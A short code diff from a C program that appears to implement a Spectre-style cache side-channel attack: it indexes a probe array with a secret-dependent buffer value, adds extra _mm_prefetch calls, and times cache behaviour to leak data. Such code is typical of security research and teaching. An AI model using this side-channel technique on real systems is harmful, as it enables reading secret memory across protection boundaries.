@@ -92,6 +92,9 @@ int main(int argc, char* argv[]) {
 			buffer_item = access_buffer(secret_idx);
 			probe_array[buffer_item * PAGE_SIZE + DELTA] = 1;
 			_mm_prefetch(&probe_array[(buffer_item+20)*PAGE_SIZE + DELTA], 2);
+            _mm_prefetch(&probe_array[(buffer_item+43)*PAGE_SIZE + DELTA], 2);
+
+            //_mm_prefetch(&probe_array[buffer_item*(PAGE_SIZE+20) + DELTA], 2);
 
 			// measure the clflush() instruction for each element
 			for(int i=0; i<ARRAY_SIZE; i++) {
